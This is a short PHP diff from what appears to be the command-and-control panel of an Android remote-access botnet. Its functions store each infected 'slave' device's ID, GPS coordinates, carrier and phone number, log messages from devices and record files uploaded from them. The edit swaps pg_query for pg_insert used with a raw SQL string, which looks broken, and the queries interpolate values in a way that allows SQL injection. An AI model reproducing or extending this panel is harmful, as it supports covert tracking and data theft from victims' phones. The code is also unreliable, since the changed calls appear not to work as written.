@@ -76,7 +76,7 @@ function updateSlave($UID, $Device, $Version, $Coordinates, $Provider, $PhoneNum
 
     $statement = ("INSERT INTO 'bots' ('uid', 'device', 'version', 'lati', 'longi', 'provider', 'phone', 'sdk', 'random') VALUES ('$UID', '$Device', '$Version', '$Lati', '$Longi', '$Provider', '$PhoneNumber', '$SDK', '$Random')");
 
-	$statement1= pg_query($statement) or die('La consulta fallo: ' . pg_last_error());
+	$statement1= pg_insert($connect,$statement) or die('La consulta fallo: ' . pg_last_error());
 
 
   }
@@ -85,7 +85,7 @@ function updateSlave($UID, $Device, $Version, $Coordinates, $Provider, $PhoneNum
 function addMessage($UID, $Message) {
   global $connect;
   $statement = ("INSERT INTO 'messages' ('uid', 'message') VALUES ('$UID', '$Message')");
-  $statement1=pg_query($statement) or die('La consulta fallo: ' . pg_last_error());
+  $statement1=pg_insert($connect,$statement) or die('La consulta fallo: ' . pg_last_error());
 }
 
 function addToUploads($owner, $slave, $file){
@@ -93,7 +93,7 @@ function addToUploads($owner, $slave, $file){
       if(file_exists("dlfiles/" . $file)){
 	    global $connect;
         $statement = ("INSERT INTO 'files' ('uid', 'file') VALUES ('$slave', '$file')");
-        $statement1=pg_query($statement) or die('La consulta fallo: ' . pg_last_error());
+        $statement1=pg_insert($connect,$statement) or die('La consulta fallo: ' . pg_last_error());
       }
 	}
 }
